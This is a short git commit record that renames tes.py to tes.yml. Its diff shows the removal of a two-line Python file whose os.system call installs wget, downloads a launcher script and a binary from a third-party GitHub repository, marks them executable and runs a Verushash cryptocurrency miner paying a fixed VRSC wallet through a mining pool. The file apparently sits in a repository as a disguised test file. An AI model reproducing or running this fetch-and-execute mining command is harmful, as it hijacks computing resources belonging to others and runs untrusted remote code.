67db1d2587de3e5af6d68597c738918ba6f85fe4
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-02-07 22:21:08 +0700

    Update and rename tes.py to tes.yml

--- tes.py
+++
@@ -1,2 +0,0 @@
-import os as alpha
-alpha.system("apt-get install wget && wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo Verushash -coin VRSC -wallet RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe  -rigName  $(echo $(shuf -i 1-2 -n 1)-joa) -pool1 na.luckpool.net:3956")
